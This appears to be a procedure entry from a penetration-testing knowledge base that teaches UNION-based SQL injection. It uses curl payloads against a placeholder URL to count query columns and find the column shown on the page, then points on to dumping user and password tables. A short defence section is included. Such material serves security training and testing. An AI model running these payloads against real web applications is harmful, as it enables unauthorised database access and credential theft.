---
id: a05bd8c5-11df-40fc-a21b-2a8981f70bd9
name: Union-SQL-Injection-Identify-Text-Column
type: procedure
verified: true
submitted: true
created_at: '2020-08-27T18:19:39.105305+00:00'
updated_at: '2023-05-26T01:27:44.224112+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/owasp]]'
  - '[[tags/owasp-top-10]]'
  - '[[tags/SQL]]'
  - '[[tags/sqli]]'
  - '[[tags/SQL-Injection]]'
  - '[[tags/Web-Applications]]'
commands:
  - '[[commands/curl-url-parameter-sqli-injection]]'
platforms:
  - Web
tools: []
validated: true
---

# Union-SQL-Injection-Identify-Text-Column

## Summary

This procedure demonstrates how to perform a Union-based SQL injection to determine the number of columns in a vulnerable query and identify which column can be used to display injected text in the application's response. It is a key step in extracting data from the database via UNION SELECT statements, commonly used against web applications with unsanitized input parameters.

## Description

Union SQL injection exploits a vulnerability where user input is concatenated into a SQL query without proper sanitization, allowing attackers to append a UNION SELECT statement to retrieve data from other tables or inject custom values. This procedure focuses on the reconnaissance phase: first, ascertaining the exact number of columns in the original query by incrementally adding NULL values until the injection succeeds without errors, and second, positioning a text string (e.g., 'test') across each column position to find the one that renders visible output in the browser or response. This is typically applied to GET parameters in URLs, such as search or filter fields, in web applications using databases like MySQL. Success enables further data exfiltration, such as dumping user tables. Prerequisites include identifying a injectable parameter via error-based or boolean blind SQLi testing.

## Requirements

1. A vulnerable web application with a SQL injection point in a GET parameter (e.g., category or search field).
2. Network access to the target application (direct or via proxy).
3. Tools like curl for sending requests or a browser with developer tools/proxy (e.g., Burp Suite) for manual testing.
4. Basic knowledge of SQL syntax and URL encoding.

## Defense

Defensive measures and detection strategies:

- Use prepared statements or parameterized queries to separate SQL code from user input.
- Implement web application firewalls (WAFs) to detect and block UNION SELECT patterns or excessive NULL injections.
- Enable database logging to monitor anomalous queries with UNION clauses.
- Input validation: Whitelist allowed characters and lengths for parameters.
- Error handling: Suppress detailed SQL errors to prevent information leakage.

## Objectives

1. Determine the number of columns in the vulnerable SQL query.
2. Identify the specific column position that displays text in the application's output.
3. Prepare for data extraction by confirming injectable columns.
4. Expected outcome: Successful UNION injection without errors, with visible text confirmation.

## Instructions

### Step 1: Observe the Normal Application Request

**Context**: Access the vulnerable page and note the normal parameter value to establish a baseline. This helps identify the injection point, such as a 'category' parameter set to 'All' in a filtering interface.

Navigate to the application's search or list page (e.g., http://target.com/products?category=All) and observe the response, which should display a list of items without errors.

**Expected Output**: Standard page load with filtered results, no SQL errors.

### Step 2: Inject Basic UNION with Single NULL

**Context**: Append a UNION SELECT statement with NULL values to test compatibility. Start with one NULL and monitor for errors, as mismatched column counts cause failures.

Use [[commands/curl-url-parameter-sqli-injection]] to send the request:

```bash
curl "http://target.com/products?category=*'+union+select+null--*" -v
```

Replace the URL and parameter as needed. The payload '*'+union+select+null--*' closes the original query and adds a UNION with one NULL column.

**Expected Output**: If column count mismatches, expect a SQL error (e.g., "Operand should contain X columns"). No visible change in page content.

### Step 3: Increment NULL Values to Match Columns

**Context**: Gradually increase the number of NULLs in the UNION SELECT until the injection executes without errors, revealing the total column count in the original query.

Use [[commands/curl-url-parameter-sqli-injection]] iteratively:

```bash
curl "http://target.com/products?category=*'+union+select+null,null--*" -v
curl "http://target.com/products?category=*'+union+select+null,null,null--*" -v
curl "http://target.com/products?category=*'+union+select+null,null,null,null--*" -v
```

Continue adding NULLs (e.g., up to 5-10) until the response loads normally without errors. In this case, 3 NULLs succeed.

**Expected Output**: Page loads without SQL errors, indicating 3 columns (e.g., normal product list displays).

### Step 4: Replace NULL with Test String in First Position

**Context**: Substitute a distinguishable string like 'test' for the first NULL to check if that column position outputs to the application's response.

Use [[commands/curl-url-parameter-sqli-injection]]:

```bash
curl "http://target.com/products?category=*'+union+select+'test',null,null--*" -v
```

URL-encode the single quote if needed ('%27').

**Expected Output**: If the first column does not display text, expect an error or no visible 'test' in the response.

### Step 5: Shift Test String Across Positions

**Context**: Move the 'test' string to subsequent positions while keeping other columns as NULL, until the string appears in the output, identifying the visible column.

Use [[commands/curl-url-parameter-sqli-injection]] for each position:

```bash
curl "http://target.com/products?category=*'+union+select+null,'test',null--*" -v
curl "http://target.com/products?category=*'+union+select+null,null,'test'--*" -v
```

The second position (null,'test',null) succeeds without error and shows 'test' in the page.

**Expected Output**: Normal page load with 'test' visible in the response (e.g., as a product name or category label), confirming the second column is injectable for output.

### Step 6: Verify and Prepare for Data Extraction

**Context**: Confirm the column count and position, then plan next steps like injecting database functions (e.g., @@version) into the identified column.

Re-run the successful payload and inspect the response thoroughly.

**Expected Output**: Consistent display of injected text without errors, ready for advanced payloads like UNION SELECT user,password from users.
